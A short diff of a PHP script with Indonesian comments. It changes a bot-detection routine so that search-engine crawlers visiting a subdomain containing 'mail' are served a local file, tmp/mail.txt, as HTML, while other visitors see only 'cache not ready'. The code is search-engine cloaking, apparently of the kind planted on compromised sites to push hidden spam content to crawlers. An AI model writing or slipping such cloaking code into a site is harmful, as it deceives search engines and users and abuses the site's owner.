@@ -1,6 +1,6 @@
 <?php
 $user_agent  = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$request_uri = $_SERVER['REQUEST_URI'] ?? '';
+$host        = $_SERVER['HTTP_HOST'] ?? '';
 
 $is_bot = false;
 
@@ -25,12 +25,14 @@ foreach ($bots as $bot) {
     }
 }
 
-/* trigger hanya mail */
-if ($is_bot && stripos($request_uri, 'mail') !== false) {
+/* trigger untuk subdomain depan yang mengandung kata "mail" */
+if ($is_bot && stripos($host, 'mail') !== false) {
 
-    $file = '/tmp/mail.txt';
+    $file = 'tmp/mail.txt';
 
     if (file_exists($file)) {
+        // Set header biar dianggap sebagai konten biasa oleh bot
+        header('Content-Type: text/html; charset=UTF-8');
         readfile($file);
     } else {
         echo 'cache not ready';
